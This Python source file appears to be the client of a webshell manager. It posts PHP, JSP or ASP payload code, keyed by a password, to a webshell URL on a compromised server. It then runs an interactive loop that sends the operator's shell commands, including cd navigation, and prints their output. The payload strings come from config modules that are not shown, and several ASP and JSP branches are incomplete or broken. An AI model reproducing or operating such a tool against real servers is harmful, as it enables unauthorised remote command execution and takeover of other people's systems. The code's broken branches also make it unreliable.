import config.shellConfig as shellC
import config.fileConfig as fileC
import requests as res


class shellManager:

    def __init__(self, con):
        self.con = con

    def Begin(self):
        self.connect = self.con.getUrl()
        self.key = self.con.getKey()
        date = {self.key: self.getBaseCode()}
        re = res.session()
        self.ress=re
        firstURL = re.post(self.connect, date)
        print(firstURL.text,'[windows下请在命令前添加 cmd.exe /c ]')
        self.shellMain(re)
        re.close()

    def getBaseCode(self):
        if self.con.getTyp() == "php":
            baseCodeForFile = shellC.PHP_shellBaseCode
        if self.con.getTyp() == "jsp":
            baseCodeForFile = shellC.JSP_shellBaseCode
        if self.con.getTyp() == "asp":
            baseCodeForFile = shellC.ASP_shellBaseCode
        # print(baseCodeForFile)
        return baseCodeForFile

    def check(self, text):
        if len(text) < 2:
            print('缺少参数')
        return len(text)

    def path(self, re):
        if self.con.getTyp() == "php":
            getpath = fileC.PHP_GETPATH
            getpath = getpath.replace('@@', self.changePath(), 1)
            date = {self.key: getpath}
            commit = re.post(self.connect, date)
        if self.con.getTyp() == "jsp":
            pass
        if self.con.getTyp() == "asp":
            getpath = fileC.ASP_GETPATH

        return commit.text

    def changePath(self):
        j = 0
        str = self.CHANGE_PATH[0]
        while j != self.i:
            j = j + 1
            str = str + '/' + self.CHANGE_PATH[j]
        if self.con.getTyp()=="php":
            changePath_ =  fileC.PHP_CHDIR.replace('##', str, 1)
        if self.con.getTyp()=="jsp":
            pass
        if self.con.getTyp()=="asp":
            changePath_ =  fileC.ASP_CHDIR.replace('##', str, 1)
        return changePath_

    def shellMain(self, re):
        self.i = 0
        self.CHANGE_PATH = dict.fromkeys(range(1024), '.')
        while True:
            if self.con.getTyp()=="php":
                self.PATH = self.path(re)+" >"
            if self.con.getTyp()=="jsp":
                self.PATH = "shell"+" >"
            if self.con.getTyp()=="asp":
                pass
            # print(PATH)
            flag = input(self.PATH)
            flag1 = flag
            if len(flag) == 0:
                continue
            
            if flag == 'exit':
                print('exit')
                flag == ''
                break
            flag1 = flag1.split()
            if flag1[0] == 'cd':
                if self.check(flag1) > 1:
                    if flag1[1] != '.' and flag1[1] != '..':
                        self.i = self.i + 1
                        self.CHANGE_PATH[self.i] = flag1[1]
                        if self.con.getTyp()=="php":
                            CD = fileC.PHP_CD.replace('@@', self.changePath(), 1)
                            date = {self.key: CD}
                        if self.con.getTyp()=="jsp":
                            pass
                        if self.con.getTyp()=="asp":
                            CD = fileC.ASP_CD.replace('@@', self.changePath(), 1)
                        
                        commit = re.post(self.connect, date)
                        # print(commit.text)
                    elif flag1[1] != '.':
                        self.i = self.i - 1
                    continue
                else:
                    continue
            if self.con.getTyp()=="php":
                cmd = shellC.PHP_shellCode
                cmd = cmd.replace('@@', self.changePath(), 1)
                cmd = cmd.replace('##', flag, 1)
                date = {self.key: cmd}
            if self.con.getTyp()=="jsp":
                cmd = shellC.JSP_shellCode
                date = {self.key:cmd,'cmd':flag}
            if self.con.getTyp()=="asp":
                cmd = shellC.ASP_shellCode
            
            
            commit = re.post(self.connect, date)
            print(commit.text, "\n")

